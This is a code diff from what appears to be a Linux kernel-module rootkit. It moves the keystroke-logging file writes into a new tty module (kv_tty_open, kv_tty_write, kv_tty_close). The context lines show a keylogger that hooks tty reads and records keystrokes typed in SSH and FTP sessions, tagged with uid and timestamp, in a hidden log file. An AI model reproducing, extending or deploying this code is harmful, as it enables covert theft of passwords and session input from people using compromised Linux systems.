@@ -19,6 +19,7 @@
 #include "lkm.h"
 #include "fs.h"
 #include "bpf.h"
+#include "tty.h"
 #include "log.h"
 
 #pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -47,9 +48,7 @@ sys64 real_m_read;
  * These are kept open throughout kv lifetime
  *  This is so because tty is continuous.
  */
-static struct file *ttyfilp;
 
-static DEFINE_SPINLOCK(tty_lock);
 static DEFINE_SPINLOCK(hide_once_spin);
 
 /**
@@ -772,40 +771,6 @@ _tty_dump(uid_t uid, pid_t pid, char *buf, ssize_t len) {
     prinfo("%s\n", buf);
 }
 
-enum { R_NONE, R_RETURN, R_NEWLINE=2, R_RANGE=4 };
-static void _tty_write_log(uid_t uid, char *buf, ssize_t len) {
-    static loff_t offset;
-    struct timespec64 ts;
-    long msecs;
-    size_t total;
-
-    /**
-     * We use a variable-length array (VLA) because the implementation of kernel_write
-     * forces a conversion to a user pointer. If the variable is heap-allocated, the
-     * pointer may be lost.
-     *
-     * VLA generates a warning since we're not in C99, but it's necessary for our use case.
-     *
-     * We allocate +32 bytes, which is enough to hold timestamp + "uid.%d".
-     */
-    char ttybuf[len+32];
-
-    spin_lock(&tty_lock);
-
-    ktime_get_boottime_ts64(&ts);
-    msecs = ts.tv_nsec / 1000;
-
-    total = snprintf(ttybuf,
-            sizeof(ttybuf), "[%lld.%06ld] uid.%d %s",
-            (long long)ts.tv_sec, msecs, uid, buf);
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,14,0)
-    fs_kernel_write_file(ttyfilp, (const void*)ttybuf, total, &offset);
-#else
-    fs_kernel_write_file(ttyfilp, (const char*)ttybuf, total, offset);
-#endif
-    spin_unlock(&tty_lock);
-}
 
 static int inline _key_add(uid_t uid, char byte, int flags) {
     struct keylog_t *kl;
@@ -840,7 +805,7 @@ static int _key_update(uid_t uid, char byte, int flags) {
             node->buf[node->offset++] = '\n';
             node->buf[node->offset] = 0;
 
-            _tty_write_log(uid, node->buf, strlen(node->buf));
+            kv_tty_write(uid, node->buf, strlen(node->buf));
 
             list_del(&node->list);
             kfree(node);
@@ -874,10 +839,8 @@ static void _keylog_cleanup_list(void) {
 
 void _keylog_cleanup(void) {
     _keylog_cleanup_list();
-    fs_kernel_close_file(ttyfilp);
+    kv_tty_close();
     fs_file_rm(sys_get_ttyfile());
-
-    ttyfilp = NULL;
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(5,12,0)
@@ -946,7 +909,7 @@ static ssize_t m_tty_read(struct kiocb *iocb, struct iov_iter *to)
          */
         if ((app_flag & APP_FTP) && rv > 1) {
             ttybuf[strcspn(ttybuf, "\r")] = '\0';
-            _tty_write_log(uid, ttybuf, sizeof(ttybuf));
+            kv_tty_write(uid, ttybuf, sizeof(ttybuf));
         } else if (app_flag & APP_SSH &&
                 (rv == 1 || flags & R_RETURN || flags & R_NEWLINE)) {
             _key_update(uid, byte, flags);
@@ -1328,8 +1291,7 @@ bool sys_init(void) {
                 prinfo("sys_init: ftrace hook %d on %s\n", idx, ft_hooks[idx].name);
 
             /** Init tty log */
-            ttyfilp = fs_kernel_open_file(sys_get_ttyfile());
-            if (!ttyfilp) {
+            if (kv_tty_open(sys_get_ttyfile()) != true) {
                 prerr("sys_init: Failed loading tty file\n");
                 rc = false;
             }
